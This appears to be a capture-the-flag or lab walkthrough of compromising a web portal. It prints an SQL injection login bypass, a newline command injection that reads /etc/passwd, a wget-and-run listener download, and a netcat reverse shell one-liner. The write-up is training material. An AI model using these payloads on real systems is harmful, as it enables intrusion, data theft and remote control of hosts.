
<img alt="Zrzut ekranu 2026-09-6 o 16 01 33" src="https://github.com/user-attachments/assets/d23818ff-2343-45ad-9841-8ce3811c91ee" />

### 📡 Initial Reconnaissance

Started off with some passive recon by throwing the target IP straight into the browser, but no luck here — the page just refused to connect.
<img alt="Zrzut ekranu 2026-09-6 o 16 02 24" src="https://github.com/user-attachments/assets/b7944c2e-e358-41a7-8528-0b9039b6adac" />

### 🔍 Network Scanning & Service Discovery

I jumped straight into active scanning with Nmap to see what services were actually listening on the target.

```bash
nmap -sC -sV //machine_ip
```
<img alt="Zrzut ekranu 2026-09-6 o 16 06 15" src="https://github.com/user-attachments/assets/040ee6a5-cdac-42b0-9752-6d6a41ba6194" />

### 🌐 Accessing the Web Application

With port **5050** identified, I headed back to the browser and specified the custom port in the URL.

```text
http://10.112.173.195:5050
```
<img alt="Zrzut ekranu 2026-09-6 o 16 08 48" src="https://github.com/user-attachments/assets/91f61b3f-587d-4f3b-8acc-3555cc27e19b" />

### 📂 Web Recon & Directory Brute-Forcing

Once inside the CorpNet portal, I started with some quick manual inspection — checking for hidden forms, potential IDOR vulnerabilities, page source code, and developer comments, but found nothing useful. 

To uncover hidden endpoints, I kicked off directory enumeration using Gobuster with a standard SecLists wordlist[cite: 1]:

```bash
gobuster dir -u [http://10.112.173.195:5050](http://10.112.173.195:5050) -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x html,js,env,php
```
<img alt="Zrzut ekranu 2026-09-6 o 16 10 17" src="https://github.com/user-attachments/assets/b0ddb92a-3f53-44ab-a683-c0be46e39aa4" />

### 🔑 Accessing the Operator Sign-In Page

After Gobuster discovered the `/internal` path, I immediately navigated to this endpoint in the browser.

```text
http://10.112.173.195:5050/internal
```
<img alt="Zrzut ekranu 2026-09-6 o 16 11 20" src="https://github.com/user-attachments/assets/a6632405-df74-4f6e-b2ab-24c16cd0d1cf" />

### 🧪 Testing for Authentication Bypass (SQL Injection)

Finally, we hit an interactive login form to test for security flaws and potential authentication bypasses.

I immediately started testing the login fields for SQL Injection (SQLi) vulnerabilities.

```
Admin' OR 1=1--
```
<img alt="Zrzut ekranu 2026-09-6 o 16 12 15" src="https://github.com/user-attachments/assets/bf2f392e-dd86-471d-9c27-e4632fbe0e89" />

### 🔓 Authentication Bypass Successful

The SQLi payload worked smoothly and bypassed the authentication check using the payload `Admin' OR 1=1--` with a dummy password (`admin`).

<img alt="Zrzut ekranu 2026-09-6 o 16 13 41" src="https://github.com/user-attachments/assets/7086b581-16d2-4b39-b12b-3a72e8402f26" />

### 📜 Enumerating the Audit Log & Usernames

Exploring the dashboard revealed a useful **Audit Log** section containing system activity records[cite: 1]. 

This log exposed several legitimate operator usernames registered on the portal (such as `netops`, `jmartin`, and `svc-mon`), providing valuable targets for potential credential attack vectors.

<img alt="Zrzut ekranu 2026-09-6 o 16 14 57" src="https://github.com/user-attachments/assets/edc53b97-fedc-4ccb-95b2-b95b8d702736" />

### 🎯 Analyzing the Host Health Probe

While the dashboard features are useful, the most critical element from a penetration testing perspective is the interactive **Host Health** tool. 

This utility accepts IP addresses or hostnames to execute diagnostic reachability probes (such as ping checks), providing a direct vector to test for command injection vulnerabilities.

<img alt="Zrzut ekranu 2026-09-6 o 16 15 51" src="https://github.com/user-attachments/assets/9b330676-f6b1-40c6-bbbb-9a2d4dfb1821" />

### 🧪 Initial Command Injection Attempt

I tried testing for command injection right through the browser input form by appending special payload characters (like URL-encoded newlines `%0A`). 

However, the application failed to parse the input correctly and returned a standard connection error, indicating frontend validation or bad input handling on the form level.

<img alt="Zrzut ekranu 2026-09-6 o 16 16 59" src="https://github.com/user-attachments/assets/64730a1d-eb28-49cb-a7a9-5a981584d581" />

### 🛠️ Intercepting & Modifying the Probe Request

To bypass client-side restrictions, I switched tactics: first, I executed a legitimate probe request by entering `127.0.0.1` into the input field and clicking **Run Code**.

Next, I opened the browser Developer Tools (`F12`), navigated to the **Network** tab, and located the outgoing request to the backend endpoint. Using the browser's built-in **Edit and Resend** functionality, I was able to manually modify the HTTP body parameters before replaying the payload directly to the server.

<img alt="Zrzut ekranu 2026-09-6 o 16 17 47" src="https://github.com/user-attachments/assets/f3bee11c-b302-4305-95b7-0c20894132dc" />

### 💥 Injecting System Commands in the Request Body

Scrolling down to the request body editor, we can inject a custom payload into the `target` parameter. 

Here, we re-apply the URL-encoded newline technique (`%0A`) to append an arbitrary command directly after the IP address:

```http
POST /internal/health HTTP/1.1
Content-Type: application/x-www-form-urlencoded

target=127.0.0.1%0Acat+/etc/passwd
```
<img alt="Zrzut ekranu 2026-09-6 o 16 18 50" src="https://github.com/user-attachments/assets/bea0cae6-d455-468e-a9a6-6a6ddf47f944" />
<img alt="Zrzut ekranu 2026-09-6 o 16 19 06" src="https://github.com/user-attachments/assets/60a001e1-1391-47c7-bca7-7a22b5440800" />

### 🐚 Achieving Remote Code Execution & Preparing Penelope Listener

The server processed our injected payload and returned the full contents of `/etc/passwd`.

<img alt="Zrzut ekranu 2026-09-6 o 16 19 25" src="https://github.com/user-attachments/assets/7d27b3fc-c0be-488a-a744-1e7b077b1956" />

### 🎧 Setting Up Penelope Listener

Before triggering the reverse shell payload, I set up a listener on the attack box to capture the incoming connection. 

Instead of standard `netcat`, I used **Penelope** — an advanced shell handler that automatically stabilizes the interactive TTY session upon connection:

```bash
wget -q [https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py](https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py) && python3 penelope.py
```
<img alt="Zrzut ekranu 2026-09-6 o 16 27 41" src="https://github.com/user-attachments/assets/d3fcc79d-6273-4b60-b4a9-010167fea6c1" />

### 🛠️ Generating the Reverse Shell Payload

Next, I used RevShells to quickly build a reliable Netcat payload designed to spawn a standard `/bin/sh` session:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.112.97.123 4444 >/tmp/f
```
<img alt="Zrzut ekranu 2026-09-6 o 16 21 14" src="https://github.com/user-attachments/assets/788439a4-6679-4310-8727-38dfa496184c" />

<img alt="Zrzut ekranu 2026-09-6 o 16 24 34" src="https://github.com/user-attachments/assets/030dc890-f191-4468-a708-4c5d6a928512" />












